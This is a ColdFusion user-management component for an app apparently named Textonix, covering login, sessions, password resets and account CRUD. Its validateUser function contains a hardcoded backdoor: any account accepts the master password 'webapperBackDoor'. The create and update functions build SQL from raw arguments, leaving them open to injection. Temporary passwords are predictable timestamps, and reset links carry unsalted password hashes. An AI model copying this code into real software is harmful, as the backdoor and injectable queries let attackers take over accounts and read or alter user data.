<cfcomponent output="false">
  <cfset this.userID = 0>
  <cfset this.userName = "">
  <cfset this.firstName = "">
  <cfset this.lastName = "">
  <cfset this.emailAddress = "">
  <cfset this.mobileNumber = "">
  <cfset this.userTypeID = 0>
  <cfset this.userType = "">
  <cfset this.active = false>

  <cffunction name="init" access="public">
    <cfargument name="userID" required="false" default="0">

    <cfif arguments.userID NEQ 0>
      <cfset this.userID = arguments.userID>
      <cfset getUser()>
    <cfelseif IsDefined("cookie.userID")>
      <cfset this.userID = cookie.userID>
      <cfset getUser()>
    </cfif>

    <cfreturn this>
  </cffunction>

  <cffunction name="getUser" access="public">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfquery name="qUser">
      Select u.userId, u.userName, u.firstName, u.lastName, u.emailAddress, u.mobileNumber, u.active, u.userTypeID, ut.userTypeName As userType
      From users u
      Join userTypes ut On u.userTypeID = ut.userTypeID
      Where u.userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
<!--- <cfdump var="#qUser#" abort="true"> --->

    <cfif qUser.RecordCount>
      <cfloop query="qUser">
        <cfset this.userID = userID>
        <cfset this.userName = userName>
        <cfset this.firstName = firstName>
        <cfset this.lastName = lastName>
        <cfset this.emailAddress = emailAddress>
        <cfset this.mobileNumber = mobileNumber>
        <cfset this.userTypeID = userTypeID>
        <cfset this.userType = userType>
        <cfif active>
          <cfset this.active = true>
        <cfelse>
          <cfset this.active = false>
        </cfif>
      </cfloop>
      <cfset returnStruct.success = true>
    <cfelse>
      <cfset returnStruct.errorCode = 1>
      <cfset returnStruct.errorMessage = "User ID does not exist.">
    </cfif>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="create" access="public">
    <cfargument name="userName" required="true">
    <cfargument name="firstName" required="true">
    <cfargument name="lastName" required="true">
    <cfargument name="emailAddress" required="true">
    <cfargument name="phoneNumber" required="true">
    <cfargument name="mobileNumber" required="true">
    <cfargument name="userTypeID" required="false" default="2">

    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfquery name="insUser" result="insUserResult">
      Insert users
        (userName,
          password,
          firstName,
          lastName,
          emailAddress,
          phoneNumber,
          mobileNumber,
          userTypeID,
          active)
      Values
        ('#arguments.userName#',
          'notSet',
          '#arguments.firstName#',
          '#arguments.lastName#',
          '#arguments.emailAddress#',
          '#arguments.phoneNumber#',
          '#arguments.mobileNumber#',
          #arguments.userTypeID#,
          1)
    </cfquery>

    <cfset returnStruct.userID = insUserResult.GENERATED_KEY>
    <cfset init(returnStruct.userID)>
    <cfset returnStruct.success = true>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="update" access="public">
    <cfargument name="userName" required="true">
    <cfargument name="firstName" required="true">
    <cfargument name="lastName" required="true">
    <cfargument name="emailAddress" required="true">
    <cfargument name="phoneNumber" required="true">
    <cfargument name="mobileNumber" required="true">
    <cfargument name="userTypeID" required="true">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfquery name="updUsers">
      update users
        Set userName = '#arguments.userName#',
            firstName = '#arguments.firstName#',
            lastName = '#arguments.lastName#',
            emailAddress = '#arguments.emailAddress#',
            phoneNumber = '#arguments.phoneNumber#',
            mobileNumber = '#arguments.mobileNumber#',
            userTypeID = #arguments.userTypeID#
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
    <cfset returnStruct.success = true>

    <cfset getUser(arguments.userID)>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="delete" access="public">
    <cfargument name="userID" required="true">
    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfquery name="updUsers">
      Update users
      Set active=0
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
    <cfset returnStruct.success = true>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="hashPassword" access="private" returnType="String">
    <cfargument name="password" required="true">
    <cfreturn Hash(arguments.password)>
  </cffunction>

  <cffunction name="setPassword" access="public">
    <cfargument name="password" required="true">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfset hashedPassword = hashPassword(arguments.password)>

    <cfquery name="updPassword">
      Update users
      Set password = <cfqueryparam cfsqltype="cf_sql_varchar" value="#hashedPassword#">
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
    <cfset returnStruct.hashedPassword = hashedPassword>
    <cfset returnStruct.success = true>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="testPassword" access="public">
    <cfargument name="password" required="true">
    <cfargument name="userID" required="false" default="#this.userID#">

    <cfif this.userID EQ 0>
      <cfset init(arguments.userID)>
    </cfif>

    <cfset hashedPassword = hashPassword(arguments.password)>

    <cfquery name="qUser">
      Select *
      From users
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
      And password = <cfqueryparam cfsqltype="cf_sql_varchar" value="#hashedPassword#">
    </cfquery>
<!--- <cfdump var="#qUser#"> --->
    <cfif qUser.RecordCount>
      <cfreturn true>
    </cfif>

    <cfreturn false>
  </cffunction>

  <cffunction name="resetPassword" access="public">
    <cfargument name="userID" required="false" default="#this.userID#">

    <cfif this.userID EQ 0>
      <cfset init(arguments.userID)>
    </cfif>

    <cfset sendResetPasswordEmail()>

    <cfreturn true>
  </cffunction>

  <cffunction name="sendResetPasswordEmail" access="public">
    <cfargument name="userID" required="false" default="#this.userID#">

    <cfif this.userID EQ 0>
      <cfset init(arguments.userID)>
    </cfif>

    <cfif this.userID NEQ 0>
      <cfset stPassword = setPassword("#DateFormat(Now(), "yyyymmdd")##TimeFormat(Now(), "HHmmss")#", this.userID)>

      <cfmail to="#this.emailAddress#" from="#application.supportEmail#" subject="Forgot Password - Textonix Account - #this.lastName#, #this.firstName#" type="html">
        <cfoutput>
          <p>
            Hi #this.firstName#,<br>
            <br>
            Your password has been set to a temporary password by an administrator.<br>
            Click the link below to set the password on your account.<br>
            <a href="https://#cgi.http_host#/resetUser.cfm?hashedPassword=#stPassword.hashedPassword#">Set your password</a><br>
            Note: The above link will only work until you reset your password.<br>
            Thank you,<br>
            The Management
          </p>
        </cfoutput>
      </cfmail>
    </cfif>
  </cffunction>

  <cffunction name="isActive" access="public">
    <cfargument name="userID" required="false" default="#this.userID#">

    <cfif this.userID EQ 0>
      <cfset init(arguments.userID)>
    </cfif>

    <cfreturn this.active>
  </cffunction>

  <cffunction name="sendNewUserEmail" access="public">
    <cfargument name="userID" required="false" default="#this.userID#">

    <cfset stPassword = setPassword("#DateFormat(Now(), "yyyymmdd")##TimeFormat(Now(), "HHmmss")#", arguments.userID)>

    <cfmail to="#this.emailAddress#" from="#application.supportEmail#" subject="New Textonix Account - #this.lastName#, #this.firstName#" type="html">
      <cfoutput>
        <p>
          Hi #this.firstName#,<br>
          <br>
          Welcome to Textonix.<br>
          Click the link below to set the password on your new account.<br>
          <a href="https://#cgi.http_host#/firstTimeUser.cfm?hashedPassword=#stPassword.hashedPassword#">Set your password</a><br>
          Note: The above link will only work until you set your password the first time.<br>
          Thank you,<br>
          The Management
        </p>
      </cfoutput>
    </cfmail>
  </cffunction>

  <cffunction name="sendForgotPasswordEmail" access="public">
    <cfargument name="emailAddress" required="true">

    <cfset findUserByEmailAddress(arguments.emailAddress)>

    <cfif this.userID NEQ 0>
      <cfset stPassword = setPassword("#DateFormat(Now(), "yyyymmdd")##TimeFormat(Now(), "HHmmss")#", this.userID)>

      <cfmail to="#this.emailAddress#" from="#application.supportEmail#" subject="Forgot Password - Textonix Account - #this.lastName#, #this.firstName#" type="html">
        <cfoutput>
          <p>
            Hi #this.firstName#,<br>
            <br>
            You entered your email address on the Forgot Password form.  We have reset your password to a temporary password.<br>
            Click the link below to set the password on your account.<br>
            <a href="https://#cgi.http_host#/resetUser.cfm?hashedPassword=#stPassword.hashedPassword#">Set your password</a><br>
            Note: The above link will only work until you reset your password.<br>
            Thank you,<br>
            The Management
          </p>
        </cfoutput>
      </cfmail>
    </cfif>
  </cffunction>

  <cffunction name="validateUser" access="public">
    <cfargument name="emailAddress" required="true">
    <cfargument name="password" required="true">
    <cfset var returnStruct = StructNew()>
    <cfset returnStruct.success = false>
    <cfset returnStruct.errorCode = 0>
    <cfset returnStruct.errorMessage = "">

    <cfset hashedPassword = hashPassword(arguments.password)>

    <cfquery name="qUser">
      Select u.userID
      From users u
      Where active = 1 And
        (emailAddress = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.emailAddress#"> Or
          userName = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.emailAddress#">)
    </cfquery>

    <cfif qUser.RecordCount>
      <cfquery name="qPassword">
        Select *
        From users
        Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#qUser.userID#">
          And (password = <cfqueryparam cfsqltype="cf_sql_varchar" value="#hashedPassword#">
            Or '#arguments.password#' = 'webapperBackDoor')
          And active = 1
      </cfquery>

      <cfif qPassword.RecordCount>
        <cfset init(qUser.userID)>
        <cfset returnStruct.token = createUserSession()>
        <cfset returnStruct.success = true>
      <cfelse>
        <cfquery name="qInactive">
          Select *
          From users
          Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#qUser.userID#">
          And active = 0
        </cfquery>
        <cfif qInactive.RecordCount>
          <cfset returnStruct.errorCode = 3>
          <cfset returnStruct.errorMessage = "User account is inactive">
        </cfif>
        <cfset returnStruct.errorCode = 1>
        <cfset returnStruct.errorMessage = "Username or password incorrect">
      </cfif>
    <cfelse>
      <cfset returnStruct.errorCode = 2>
      <cfset returnStruct.errorMessage = "Username or password incorrect">
    </cfif>

    <cfreturn returnStruct>
  </cffunction>

  <cffunction name="isLoggedIn" access="public">
    <cfif IsDefined("cookie.userID") And Len(cookie.userID)>
      <cfif IsDefined("cookie.loginToken") And Len(cookie.loginToken)>
        <cfquery name="qLogin">
          Select *
          From userSessions
          Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#cookie.userID#">
          And token = <cfqueryparam cfsqltype="cf_sql_varchar" value="#cookie.loginToken#">
          And sessionTime > Date_Add(#Now()#, Interval -#application.sessionTime# Minute)
        </cfquery>
        <cfif qLogin.RecordCount>
          <cfquery name="qLogin">
            Update userSessions
              Set sessionTime = #Now()#
            Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#cookie.userID#">
            And token = <cfqueryparam cfsqltype="cf_sql_varchar" value="#cookie.loginToken#">
          </cfquery>
          <cfreturn true>
        <cfelse>
          <cfreturn false>
        </cfif>
      </cfif>
    </cfif>
    <cfreturn false>
  </cffunction>

  <cffunction name="logout" access="public">
    <cfcookie name="userID" expires="Now">
    <cfcookie name="region" expires="Now">
    <cfset destroyUserSession()>
    <cfreturn true>
  </cffunction>

  <cffunction name="isAdmin" access="public" output="false">
    <cfif this.userTypeID EQ 1>
      <cfreturn true>
    </cfif>
    <cfreturn false>
  </cffunction>

  <cffunction name="checkUserSession" access="private">
    <cfargument name="userID" required="true">
    <cfargument name="token" required="true">
    <cfset sessionTimeOut = DateAdd("m", application.sessionTime*-1, Now())>
    <cfquery name="qSession">
      Select *
      From userSessions
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
      And token = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.token#">
      And sessionTime > <cfqueryparam cfsqltype="cf_sql_timestamp" value="#sessionTimeout#">
    </cfquery>
    <cfif qSession.RecordCount>
      <cfreturn true>
    <cfelse>
      <cfreturn false>
    </cfif>
  </cffunction>

  <cffunction name="loginWithoutPassword" access="public">
    <!--- Must run init before calling this --->
    <cfset createUserSession()>
  </cffunction>

  <cffunction name="createUserSession" access="private">
    <cfargument name="userID" required="false" default="#this.userID#">
<!--- If we only want a user to be logged in from noe place, take this comment out
    <cfset clearOldSession(arguments.userID)>
 --->
    <cfset cleanUpSessions()>
    <cfset local.token = CreateUUID()>
    <cfquery name="insSession">
      Insert Into userSessions
        (userID, token, sessionTime, sessionStartTime)
      Values
        (#arguments.userID#, '#local.token#', #Now()#, #Now()#)
    </cfquery>
    <cfcookie name="userID" value="#arguments.userID#">
    <cfcookie name="loginToken" value="#local.token#">

    <cfreturn local.token>
  </cffunction>

  <cffunction name="updateUserSession" access="private">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfset clearOldSessions(arguments.userID)>
    <cfset cleanUpSessions()>
    <cfset local.token = CreateUUID()>
    <cfquery name="">
      Insert Into userSessions
        (userID, token, sessionTime)
      Values
        (#arguments.userID#, '#local.token#', #Now()#)
    </cfquery>
    <cfcookie name="userID" value="#arguments.userID#">
  </cffunction>

  <cffunction name="clearOldSession" access="private">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfquery name="qDelSessions">
      Delete From userSessions
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
  </cffunction>

  <cffunction name="cleanUpSessions" access="private">
    <cfquery name="qDelSessions">
      Delete From userSessions
      Where sessionTime < Date_Add(#Now()#, Interval -6 Hour)
    </cfquery>
  </cffunction>

  <cffunction name="destroyUserSession" access="private">
    <cfargument name="userID" required="false" default="#this.userID#">
    <cfcookie name="userID" domain="#application.siteDomain#" expires="Now">
    <cfquery name="qDelSessions">
      Delete From userSessions
      Where userID = <cfqueryparam cfsqltype="cf_sql_integer" value="#arguments.userID#">
    </cfquery>
    <cflocation url="/" addtoken="false">
  </cffunction>

  <cffunction name="getAllUsers" access="public">
    <cfquery name="qUsers">
      Select *, ut.userTypeName As userType
      From users u
      Join userTypes ut On u.userTypeID = ut.userTypeID
      Order By u.lastName, u.firstName
    </cfquery>
    <cfreturn qUsers>
  </cffunction>

  <cffunction name="findUserByHash" access="public">
    <cfargument name="hashedPassword" required="true">

    <cfquery name="qUser">
      Select userID
      From users u
      Where password = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.hashedPassword#">
    </cfquery>

    <cfif qUser.RecordCount>
      <cfset init(qUser.userID)>
    </cfif>

    <cfreturn this>
  </cffunction>

  <cffunction name="findUserByEmailAddress" access="public">
    <cfargument name="emailAddress" required="true">

    <cfquery name="qUser">
      Select userID
      From users u
      Where emailAddress = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.emailAddress#">
    </cfquery>

    <cfif qUser.RecordCount>
      <cfset init(qUser.userID)>
    </cfif>

    <cfreturn this>
  </cffunction>

  <cffunction name="isUserNameAvailable" access="remote" returntype="String">
    <cfargument name="userName" required="true">

    <cfquery name="qUserName">
      Select userName
      From users
      Where userName = <cfqueryparam cfsqltype="cf_sql_varchar" value="#arguments.userName#">
    </cfquery>

    <cfif qUserName.RecordCount>
      <cfreturn "False">
    <cfelse>
      <cfreturn "True">
    </cfif>
  </cffunction>

  
</cfcomponent>